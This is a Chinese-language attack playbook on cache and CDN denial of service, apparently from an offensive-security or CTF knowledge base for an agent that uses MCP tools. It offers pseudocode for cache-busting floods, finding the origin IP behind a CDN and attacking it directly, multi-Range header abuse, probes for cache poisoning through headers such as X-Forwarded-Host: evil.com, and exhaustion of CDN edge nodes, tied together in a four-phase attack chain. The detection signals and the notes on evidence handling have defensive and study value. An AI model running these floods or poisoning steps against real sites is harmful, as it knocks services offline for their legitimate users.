# 缓存 / CDN 拒绝服务

## 场景

CDN 和缓存层本应保护源站，但攻击者可以反过来利用其特性，要么绕过 CDN 直打源站，要么使缓存本身成为瓶颈，或在缓存中注入恶意内容导致 DoS。

```
攻击目标:
  - 源站: 绕过 CDN 直打 (Origin Shield 失效)
  - CDN 节点: 节点本身资源耗尽
  - 缓存层: Varnish/Nginx cache/Squid → 内存/磁盘爆满
```

## 输入信号

- URL 参数中出现高 entropy 随机值 (`?cb=abc123&_=1620000000` 等 cache busting 特征)
- 缓存命中率从 > 80% 骤降至 < 20%，源站流量骤增 5-10 倍
- 大量 `Cache: MISS` 或 `X-Cache: MISS` 响应头，同一路径参数不同值
- 源站健康检查 `/health` 或静态资源响应时间飙升 (CDN 穿透导致)
- CDN 日志中同一路径出现数千个不同 query string 变体
- 错误页面或白屏被 CDN 缓存 (cache poisoning)，合法用户获取 404/500/空响应
- DNS 历史记录或 crt.sh 中突然出现源站真实 IP 的解析记录
- CDN 特定边缘节点 CPU/连接数异常，区域性用户受影响
- HTTP Range 请求占比异常高，且 Range 值非标准对齐

---

## 方法 1: Cache Busting — 缓存穿透攻击

### 原理

通过随机化 URL 参数或路径，使每个请求都穿透缓存直达源站，将 CDN 的流量过滤效果归零。

```
正常:
  用户 → CDN (命中) → 不访问源站
  10000 qps → CDN 0 qps 到源站

攻击:
  攻击者 → CDN /page?v=<random> → cache miss → 源站
  每个请求 URL 不同 → 永远 miss
  10000 qps → CDN 10000 qps 到源站 → 源站被打穿
```

### 常用 Cache Busting 手法

```
1. 随机查询参数:
   /page?cb=abc123
   /page?_=1620000000
   /page?r=xyz789
   
2. 随机路径片段:
   /page/abc123/
   /api/v1/data/random123
   
3. HTTP Header 变化:
   Accept: text/html,application/xhtml+xml → miss on Vary: Accept
   Accept-Language: zh-CN → miss on Vary: Accept-Language
   X-Forwarded-For: random_IP → 某些 CDN 按此分片缓存

4. Cookie 变化:
   Cookie: session=random_value → Vary: Cookie → 无限 cache miss
   
5. 大小写抖动:
   /Page → cache miss (CDN 对大小写敏感)
   /page → hit
   /PAGE → miss
```

### 伪代码

```
function cache_busting_flood(target_url, qps=5000, duration=300):
    """
    绕过 CDN 缓存直接打源站
    
    原理: 每次请求附加随机参数 → 缓存永远未命中 → CDN 转发到源站
    效果: CDN 从"防护墙"变成"流量管道"
    """
    
    param_names = ["cb", "_", "r", "t", "rand", "nonce", "cache"]
    
    deadline = now() + duration
    count = 0
    
    while now() < deadline:
        # 方法1: 随机查询参数
        param = param_names[count % len(param_names)]
        value = random_alphanumeric(8, 16)
        url = f"{target_url}?{param}={value}"
        
        # 方法2: 多路径变体
        # url = f"{target_url}/cache/{random_alphanumeric(6)}/"
        
        http_get(url, headers={
            "Accept": random_choice([
                "text/html", "application/json", 
                "text/plain", "application/xml"
            ]),
            "Accept-Language": random_choice([
                "en-US", "zh-CN", "fr-FR", "de-DE", "ja-JP"
            ]),
            # 不要带常见的 Cache-Control 头 → 避免触发 bypass
        })
        
        count += 1
        
    # 检测效果: 同时探测源站响应时间
    # 如果 /health (无缓存 key) 响应时间升高 → 源站已被打中
```

## 方法 2: CDN 源站暴露

### 原理

找出源站真实 IP，绕过 CDN 直接攻击。

```
CDN 隐藏模式:
  用户 → CDN (anycast IP) → 源站 (真实 IP 隐藏)
  
源站暴露方法:
  1. DNS 历史记录 (SecurityTrails, Censys)
  2. 证书透明度日志 (crt.sh)
  3. 邮件头 (SPF/MX 记录)
  4. 子域名爆破 (dev/staging/stg/uat/...)
  5. 源站回显 (错误页面、SSL 证书)
  6. Favicon hash 搜索 (Shodan)
  7. HTTP/HTTPS 直接 IP 访问 → 默认虚拟主机返回
```

### 源站发现伪代码

```
function discover_origin_ip(domain):
    """
    多路径发现 CDN 背后的源站
    返回可能的源站 IP 列表
    """
    candidates = Set()
    
    # 1. DNS 历史
    dns_history = query_securitytrails(domain)
    for record in dns_history:
        if record.type == "A" and not is_cdn_ip(record.value):
            candidates.add(record.value)
    
    # 2. 证书透明度
    crt_entries = query_crtsh(domain)
    for entry in crt_entries:
        # 解析证书中的 SAN
        for san in entry.subject_alt_names:
            san_ip = resolve_dns(san)
            if san_ip and not is_cdn_ip(san_ip):
                candidates.add(san_ip)
    
    # 3. 子域名爆破
    subdomains = wordlist_bruteforce(domain, 
        wordlist=["dev", "staging", "origin", "direct", "backend",
                  "admin", "portal", "old", "v1", "api-internal",
                  "test", "uat", "prod", "app", "www2", "beta"])
    for sub in subdomains:
        ip = resolve_dns(sub)
        if ip and not is_cdn_ip(ip):
            candidates.add(ip)
    
    # 4. 邮件 DNS 记录
    for record_type in ["MX", "SPF", "TXT"]:
        records = resolve_dns(domain, record_type)
        for r in records:
            ips = extract_ips(r)
            for ip in ips:
                if not is_cdn_ip(ip):
                    candidates.add(ip)
    
    # 5. Shodan 搜索
    shodan_results = shodan_search(f"ssl.cert.subject.cn:{domain}")
    for result in shodan_results:
        if not is_cdn_ip(result.ip):
            candidates.add(result.ip)
    
    # 6. 过滤: 验证候选 IP
    real_origin = []
    for ip in candidates:
        # 尝试直接访问
        resp = http_get(f"https://{ip}", 
                        headers={"Host": domain},
                        verify_ssl=False)
        if resp.status == 200 and domain_signature in resp.body:
            real_origin.append(ip)
            print(f"[!] Confirmed origin: {ip}")
    
    return real_origin
```

### 利用暴露的源站

```
# 找到源站 IP 后，直接攻击
# CDN 不再提供任何保护

origin_ips = discover_origin_ip("target.com")

# 直接发动所有 DoS 技术，无需 CDN bypass
for ip in origin_ips:
    launch_syn_flood(ip)
    launch_slowloris(ip)
    launch_tls_flood(ip)
    # CDN 完全不知道源站正在被攻击
```

## 方法 3: Range Header 缓存穿透

### 原理

某些 CDN 对 `Range` header 的处理有漏洞：Range 请求永远 miss 缓存，或导致 CDN 从源站拉取并处理分段数据。

```
正常缓存:
  GET /video.mp4 → 200 → 缓存 CDN

Range 穿透:
  GET /video.mp4 + Range: bytes=0-1023     → miss → 源站拉取 → 缓存部分
  GET /video.mp4 + Range: bytes=0-2047     → miss → 源站重新拉取
  GET /video.mp4 + Range: bytes=1024-2047  → miss → 源站重新拉取
  
  由于 Range 组合无限多，每次都可能穿透
  更糟的是 CDN 可能为每个 Range 请求从源站完整下载 → 放大
```

### 多 Range 请求放大

```
# 单请求要求多个 Range
# 服务器响应 multipart/byteranges，体积 = sum(ranges)
# 某些 CDN 处理多 Range 时严重消耗资源

GET /large-file HTTP/1.1
Host: target.com
Range: bytes=0-100,200-300,400-500,600-700,...,9900-10000

# 如果构造大量非对齐或重叠的 Range:
Range: bytes=0-1,1-2,2-3,...,999999-1000000
# → 服务器生成 1M 个 multipart 分片 → CPU 打满
```

### 伪代码

```
function range_header_abuse(target_url, duration=300, rate=100):
    """
    利用 Range 请求绕过缓存并消耗源站
    
    技术:
      1. 大量小 Range → CDN 转发到源站
      2. 异常 Range → 触发源站错误处理路径
      3. 多 Range → 源站 multipart 响应生成
    """
    
    deadline = now() + duration
    
    while now() < deadline:
        # 随机 Range 绕过缓存
        ranges = []
        for _ in range(random_int(1, 100)):
            start = random_int(0, 10_000_000)
            end = start + random_int(1, 1000)
            ranges.append(f"{start}-{end}")
        
        range_header = "bytes=" + ",".join(ranges)
        
        http_get(target_url, headers={"Range": range_header})
        
        # 反转 Range 触发异常路径
        # Range: bytes=1000-500 → 非法 → 可能触发 416 或忽略
        
        # 从末尾请求
        # Range: bytes=-1 → "最后 1 字节"
        # Range: bytes=-1000000000000 → 超大后缀范围
```

## 方法 4: Cache Poison DoS

### 原理

向 CDN/缓存注入恶意内容，使正常用户获取到错误/无效响应，等效于服务不可用。

```
攻击路径:

1. 注入错误页面:
   /page?x=<script> → 服务器返回 200 (含 XSS)
   CDN 缓存此响应 → 所有用户获取 XSS 版本
   
2. 注入 404:
   构造导致 404 的请求 → CDN 缓存 404
   后续合法请求返回 404 → 用户看到"页面不存在"

3. 注入空响应:
   使源站对某路径返回 0-byte
   CDN 缓存空响应 → 所有用户看到白屏

4. 注入重定向循环:
   源站返回 302 → / → CDN 缓存
   所有用户无限重定向

5. 注入 500 错误:
   触发源站错误 → CDN 缓存 500 页面
   合法用户看到服务器错误
```

### 利用 HTTP Header 缓存投毒

```
# 一些 CDN 缓存时包含请求 header 的 hash
# 攻击者可以操控 header 值使恶意响应被缓存

# 攻击步骤:
# 1. 找到缓存 key 中包含的 header (通常是 Host, 有时包含 X-Forwarded-Host)
# 2. 构造请求，使恶意 header 值进入缓存 key
# 3. 服务器响应中包含注入的内容
# 4. 缓存以特殊 key 存储此响应
# 5. 触发合法用户使用相同 key 获取缓存 → 看到恶意响应

# 示例: X-Forwarded-Host 投毒
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

# 如果服务器在响应中回显 X-Forwarded-Host
# 且 CDN 据此分片缓存
# 则 evil.com 对应的缓存中包含投毒响应
```

### 伪代码

```
function cache_poison_dos(target, cache_key_header="X-Forwarded-Host"):
    """
    利用缓存投毒实现 DoS: 使合法用户看到错误/恶意响应
    
    Step 1: 找到可注入的 header
    Step 2: 注入恶意内容
    Step 3: 缓存此响应
    Step 4: 验证合法用户获取到 poisoned cache
    """
    
    # 探测: 哪些 header 影响缓存 key
    probe_headers = [
        "X-Forwarded-Host", "X-Forwarded-Scheme",
        "X-Forwarded-Port", "X-Forwarded-For",
        "X-Original-URL", "X-Rewrite-URL",
        "X-HTTP-Method-Override", "X-Original-Host",
        "Accept", "Accept-Language",
    ]
    
    for header in probe_headers:
        # 发起带有 header 的请求
        probe_value = "poisoned-" + random_alphanumeric(6)
        resp1 = http_get(target, headers={header: probe_value})
        
        # 再发一次完全相同的请求 (模拟缓存命中)
        resp2 = http_get(target, headers={header: probe_value})
        
        # 检查响应中是否有我们的注入值
        if probe_value.encode() in resp2.body and resp1.status == resp2.status:
            print(f"[!] Cache key influenced by: {header}")
            print(f"[!] Response contains injected value → cache poisonable!")
            
            # 注入恶意内容 DoS
            # 例如: 注入超长响应 → 占用缓存空间
            # 例如: 注入 302 到无限循环
            # 例如: 注入空 body → 页面白屏
```

## 方法 5: CDN 节点资源耗尽

### 原理

CDN 节点（Edge server）本身也是服务器，也有资源限制。攻击者针对特定 PoP 节点进行资源耗尽。

```
攻击 CDN PoP:
  1. 扫描发现 CDN 的边缘 IP (BGP/anycast IP)
  2. 对特定 PoP 发送大量请求
  3. 消耗该 PoP 的连接池 / 内存 / CPU
  
  注意: CDN 通常有大量 PoP，但:
    - 某地区用户主要命中少数 PoP
    - 打掉一个区域的 PoP → 该区域用户受影响
    - 单 PoP 资源有限 (每个 PoP 不是无限的)
```

### 伪代码: CDN 单节点压力

```
function cdn_edge_exhaust(target_url, edge_count=5, req_per_edge=5000):
    """
    发现并攻击特定 CDN 边缘节点
    
    技巧: 通过 DNS 解析获取就近 PoP 的 IP
         对每个 IP 发起攻击
    """
    
    # 1. 从不同地理位置解析 DNS 获取不同 PoP IP
    edge_ips = Set()
    
    for region in ["US-East", "US-West", "EU-West", "EU-Central",
                   "Asia-East", "Asia-South", "SA-East", "AF-South"]:
        # 使用该区域的 VPS/代理进行 DNS 解析
        ips = resolve_dns_from_region(target_url.host, region)
        for ip in ips:
            edge_ips.add(ip)
    
    print(f"[*] Discovered {len(edge_ips)} CDN edge IPs")
    
    # 2. 对每个边缘节点直接攻击
    for edge_ip in list(edge_ips)[:edge_count]:
        spawn:
            # 对该 edge IP 发送 Slowloris + SYN flood
            # Host header 设为原始域名
            tls_flood(
                target=edge_ip,
                sni=target_url.host,
                rate=req_per_edge,
                duration=300
            )
    
    # CDN 单节点被打挂 → 请求路由到其他节点
    # 连锁反应 → 其他节点过载 → 整个 CDN 对该区域降级
```

## 攻击链

```
Phase 1 — 源站暴露:
  1. 通过 DNS 历史 / CT / 子域爆破 找源站 IP
  2. 直接攻击源站 → CDN 保护完全绕过

Phase 2 — 缓存穿透:
  3. Cache Busting → 打穿 CDN 缓存 → 直击源站
  4. Range Header 滥用 → 多层穿透

Phase 3 — 缓存投毒:
  5. 注入恶意缓存内容 → 正常用户获取错误页面
  6. 注入重定向循环 → 用户无限重定向

Phase 4 — CDN 节点耗尽:
  7. 发现边缘 IP → 直接攻击 CDN 节点
  8. 区域性降级 → 放大影响范围
```

## 参考资料

1. "Practical Cache Poisoning" — James Kettle, Black Hat 2020
2. "Web Cache Entanglement" — James Kettle, Black Hat 2021
3. "CPDoS: Cache Poisoned Denial of Service" — Hoai Viet Nguyen et al., 2019
4. CVE-2022-32293 — TCP Middlebox Reflection (AWS NLB → CDN origin)
5. "Origin-exposing: Circumventing CDN Protection" — Cloudflare Research
6. Shodan/Censys search: `ssl.cert.subject.cn:target.com` for origin discovery
7. crt.sh — Certificate Transparency log for subdomain/origin enumeration
8. RFC 7233 — HTTP Range Requests (abuse potential)
9. "Cache Deception Attack" — Omer Gil, Black Hat 2017
10. SecurityTrails / DNSDumpster — Historical DNS record query

## MCP 工具映射

| 步骤 | 工具 | 说明 |
|------|------|------|
| DNS 历史/CT | `http_probe` | 探测域名 DNS 和证书信息 |
| 缓存行为探测 | `http_probe` | 发送变体请求看缓存命中情况 |
| 技术搜索 | `kb_router` | 搜索 cache / cdn / poison / busting |

## 证据与验证闭环

- 保存 baseline 与单变量 probe 的完整请求、响应状态、关键响应头和正文摘要。
- 将“响应差异”与服务端副作用分开记录；只有权限、状态、数据或 Flag 可重复变化才算确认。
- 从全新 session/重置状态最小化重放，记录依赖、并发参数、时间窗口及失败样本。
- 输出统一放入 `exports/ctf-website/<case>/`，凭据只用 `REDACTED` 占位，自动检索 `flag{}`、`CTF{}`、`DASCTF{}`。
